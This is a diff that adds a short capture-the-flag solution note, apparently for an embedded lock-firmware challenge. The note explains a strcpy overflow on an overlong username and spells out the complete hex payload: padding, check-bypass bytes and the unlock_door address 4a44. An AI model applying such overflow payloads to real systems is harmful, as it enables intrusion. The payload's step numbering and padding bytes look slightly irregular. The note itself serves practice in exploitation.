@@ -1,0 +1,20 @@
+username:AABBAABBAABBAABBAABBAABBAABBAABBAABBAABB  (20 tuples)
+password: CCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDDCCDD  (28 tuples)
+
+strcpy can be be overflowed. I'm aiming to insert 4a44 at the 43c0 mem address  with the unlock_door address.
+We notice that strcopy can be overflowed when passing a bigger than expected username. Thus we can exploit this to pass the unlock_door mem address at the above mentioned positioned.
+(We don't care about the strcpy for the password bc it doesn't reach an interesting memory address).
+
+So we need to pass an appropriate long username that can also pass the mov.b  -0x19(r4), r15 check:
+
+1) 41414141414141414141414141414141 -> 16 bytes of random chars for padding
+
+2) 45114748-> 4 bytes to pass the checks
+
+3) 49505152535455565758596061626364646567686870 -> more padding
+
+5) unlock_door address -> 4a44
+
+and the password can be random (as long as it's between 8-17 chars) -> 4141414141414141414141414141414141
+
+So username is: 4141414141414141414141414141414145114748495051525354555657585960616263646465676868704a44
